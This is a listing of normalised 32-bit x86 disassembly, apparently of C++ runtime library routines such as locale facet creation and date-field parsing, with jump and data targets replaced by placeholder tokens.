mov [ ebp - 0x4 ] 0x3
jmp r-xdata
lea eax [ ebx + 0x10 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10049f6e
or [ esi ] eax
add esp 0x18
dec [ ebx + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
or [ esi ] 0x2
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10042d3e
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_10042d3e
cmp ax [ ebp - 0x18 ]
jne r-xdata
lea eax [ ebx + 0xc ]
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10049f6e
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10042bc0
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10042d3e
movzx ecx [ ebp - 0x8 ]
movzx eax ax
add ecx 0x9
cmp ecx eax
jl r-xdata
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
or [ esi ] 0x1
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10048504
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10049f6e
or [ esi ] eax
add esp 0x18
dec [ ebx ]
jmp r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004d1f2
jmp r-xdata
add ebx 0xc
push ebx
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10049f6e
add esp 0x18
or [ esi ] eax
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
sub_1004a5f9
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x7f3
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_10049f6e
mov ecx [ ebp + 0x20 ]
or [ ecx ] eax
mov eax [ ecx ]
add esp 0x18
test al 0x2
jne r-xdata
test [ ecx ] 0x2
jne r-xdata
mov edx 0x76c
cmp [ ebp - 0x4 ] edx
jl r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x20
mov eax [ ebp + 0x24 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x14 ] ecx
cmp [ ebp - 0x4 ] 0x87
jle r-xdata
sub [ ebp - 0x4 ] edx
jmp r-xdata
or eax 0x2
mov [ ecx ] eax
sub_1004a667
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0x8 ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10043580
add esp 0x10
test eax eax
jge r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x18 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_1004a6a7
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0xc ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10043580
add esp 0x10
test eax eax
jge r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_1004a6e7
push 0x98
mov eax sub_1004f917
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp eax edi
je r-xdata
push 0x5
pop eax
call sub_1002b37e
retn
cmp [ eax ] edi
jne r-xdata
push 0x1c
call sub_1002738b
pop ecx
mov [ ebp - 0x14 ] eax
push 0x3
mov [ ebp - 0x4 ] edi
pop esi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x30 ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp - 0x14 ]
push edi
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_10049efe
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
call sub_1000794c
test [ ebp - 0x10 ] 0x2
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_100020e2
sub_1004a791
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10048cdf
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_1004a82e
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004a6e7
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_1004a8cb
push 0x8
mov eax sub_1004f586
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov eax [ ebp + 0xc ]
and eax 0x2
mov [ ebp - 0x10 ] eax
je r-xdata
mov ebx [ ebp + 0xc ]
and ebx 0x8
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_10007a4d
pop ecx
push eax
push 0x20
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
test [ ebp + 0xc ] 0x1
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_1000644e
pop ecx
push eax
push 0x10
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_100078bb
mov esi eax
jmp r-xdata
test [ ebp + 0xc ] 0x20
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_100063b1
pop ecx
push eax
push 0x10
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1000699e
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
mov ebx [ ebp + 0xc ]
and ebx 0x4
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_100448c3
pop ecx
push eax
push 0x10
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1000697d
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_10044960
pop ecx
push eax
push 0x8
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_10041de4
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_1000654d
pop ecx
push eax
push 0x18
call sub_1002738b
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0xe
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
cmp ebx edi
je r-xdata
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
mov ebx [ ebp + 0xc ]
and ebx 0x10
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_100449fd
pop ecx
push eax
push 0x10
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor esi esi
mov [ eax + 0x4 ] edi
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_100069bf
mov esi eax
jmp r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_10044a9a
pop ecx
push eax
push 0x10
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_10041e28
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_1004a791
pop ecx
push eax
push 0x1c
call sub_1002738b
pop ecx
mov ecx eax
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] 0x2c
cmp ecx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_10041e4b
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
call sub_1002b37e
retn
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_10044c71
pop ecx
push eax
push 0x14
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
call sub_100484d1
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_10044b37
pop ecx
push eax
push 0x34
call sub_1002738b
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x20
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
cmp ebx edi
je r-xdata
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_10025470
pop ecx
push eax
push 0x10
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_10041d80
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_10042fad
mov esi eax
jmp r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_100247d0
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_10044bd4
pop ecx
push eax
push 0x34
call sub_1002738b
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x26
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
cmp ebx edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_10042ff9
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
sub_1004ad5c
push 0x8
mov eax sub_1004f586
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov eax [ ebp + 0xc ]
and eax 0x2
mov [ ebp - 0x10 ] eax
je r-xdata
mov ebx [ ebp + 0xc ]
and ebx 0x8
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_10044826
pop ecx
push eax
push 0x20
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
test [ ebp + 0xc ] 0x1
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_10044d0e
pop ecx
push eax
push 0x10
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_10041a90
mov esi eax
jmp r-xdata
test [ ebp + 0xc ] 0x20
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_10044dab
pop ecx
push eax
push 0x10
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_10041e86
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
mov ebx [ ebp + 0xc ]
and ebx 0x4
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_10044ee5
pop ecx
push eax
push 0x10
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_10041f66
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_10044f82
pop ecx
push eax
push 0x8
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_10041fc2
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_10044e48
pop ecx
push eax
push 0x18
call sub_1002738b
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0xe
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
cmp ebx edi
je r-xdata
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
mov ebx [ ebp + 0xc ]
and ebx 0x10
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_1004501f
pop ecx
push eax
push 0x10
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor esi esi
mov [ eax + 0x4 ] edi
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_10042bff
mov esi eax
jmp r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_100450bc
pop ecx
push eax
push 0x10
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1004212a
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_1004a82e
pop ecx
push eax
push 0x1c
call sub_1002738b
pop ecx
mov ecx eax
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] 0x2c
cmp ecx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_100421bb
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
call sub_1002b37e
retn
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_10045293
pop ecx
push eax
push 0x14
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
call sub_10049efe
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_10045159
pop ecx
push eax
push 0x34
call sub_1002738b
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x20
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
cmp ebx edi
je r-xdata
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_10045330
pop ecx
push eax
push 0x10
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_100422bf
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_10043045
mov esi eax
jmp r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_100417d8
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_100451f6
pop ecx
push eax
push 0x34
call sub_1002738b
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x26
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
cmp ebx edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_10043091
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
sub_1004b1ed
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_100416db
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1004b210
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004dd9b
add esp 0x14
pop ebp
retn 0x10
sub_1004b231
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp ecx [ ebp + 0xc ]
jne r-xdata
movsx edx [ ecx ]
rol eax 0x8
add eax edx
inc ecx
pop ebp
retn 0x8
sub_1004b255
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1004173c
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1004b278
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1004173c
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1004b2dd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
and [ esi + 0x8 ] 0x0
call sub_10041698
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1004b320
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1004b304
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1004b341
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1004b29b
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1004b362
mov edi edi
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
lea ecx [ ebp + 0x14 ]
call sub_10006ccf
movzx eax [ eax ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003f048
dec [ ebp + 0x1c ]
lea ecx [ ebp + 0x14 ]
call sub_10006d06
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
sub_1004b39e
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x14 ]
lea ecx [ ebp + 0xc ]
call sub_1003f048
dec [ ebp + 0x18 ]
jne r-xdata
sub_1004b3c9
push 0x10
mov eax sub_1004f5a1
call sub_1002b2d9
mov esi ecx
mov [ ebp - 0x14 ] esi
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_10007876
mov ecx [ eax ]
lea ebx [ esi + 0x2c ]
mov [ ebx ] ecx
mov eax [ eax + 0x4 ]
mov [ ebx + 0x4 ] eax
call sub_10027b31
mov edi eax
xor eax eax
push ebx
push eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
push [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
call sub_10006c37
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x10 ]
mov eax [ edi + 0xc ]
jmp r-xdata
push ebx
push 0x0
push eax
call sub_10006c37
mov [ esi + 0x14 ] eax
add esp 0xc
cmp [ edi + 0x2f ] 0x4
mov eax r--data
ja r-xdata
mov eax [ edi + 0x20 ]
push ebx
push 0x0
push eax
call sub_10006c37
mov [ esi + 0x10 ] eax
add esp 0xc
cmp [ edi + 0x2e ] 0x4
mov eax r--data
ja r-xdata
push ebx
push 0x0
push eax
call sub_10006c37
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x14 ]
mov al [ eax ]
mov [ esi + 0xc ] al
mov eax [ edi + 0x18 ]
mov al [ eax ]
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0xd ] al
je r-xdata
mov eax [ edi + 0x24 ]
mov al [ edi + 0x29 ]
mov al [ edi + 0x28 ]
jmp r-xdata
and [ esi + 0x1c ] 0x0
cmp eax 0x7f
jl r-xdata
movsx eax al
mov [ esi + 0x1c ] eax
test eax eax
jl r-xdata
call sub_1002b37e
retn 0x8
push 0x4
mov esi r--data
push esi
push ebx
call sub_1002a0f0
push 0x4
push esi
push [ ebp + 0x8 ]
call sub_1002a0f0
add esp 0x18
movsx eax [ edi + 0x2e ]
push eax
movsx eax [ edi + 0x2a ]
push eax
movsx eax [ edi + 0x2b ]
push eax
lea ebx [ esi + 0x20 ]
push ebx
mov ecx esi
call sub_1004178c
movsx ecx [ edi + 0x2f ]
push ecx
movsx ecx [ edi + 0x2c ]
push ecx
movsx ecx [ edi + 0x2d ]
lea eax [ esi + 0x24 ]
push ecx
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_1004178c
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_1004b516
push 0x4
mov eax sub_1004ee15
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x14 ]
mov al [ ebp + 0x10 ]
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x28 ] al
call sub_1004b3c9
mov eax esi
call sub_1002b37e
retn 0x10
sub_1004b552
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ecx ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
neg eax
push eax
lea ecx [ ebp - 0x8 ]
call sub_10042597
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x8
sub_1004b584
